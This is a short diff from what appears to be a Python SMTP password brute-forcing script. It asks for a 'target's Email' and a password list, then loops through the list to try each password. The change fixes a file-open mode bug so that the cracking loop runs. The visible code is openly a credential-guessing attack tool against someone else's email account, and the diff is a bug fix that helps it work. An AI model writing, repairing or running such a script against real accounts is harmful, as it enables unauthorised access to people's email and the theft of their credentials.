@@ -9,7 +9,7 @@ smtpserver.starttls()
 
 user= input ("Enter target's Email :")
 passwfile= input ("Enter password File :")
-passwfile= open(passwfile, "read")
+passwfile= open(passwfile, "r")
 
 for password in passwfile :
     try :
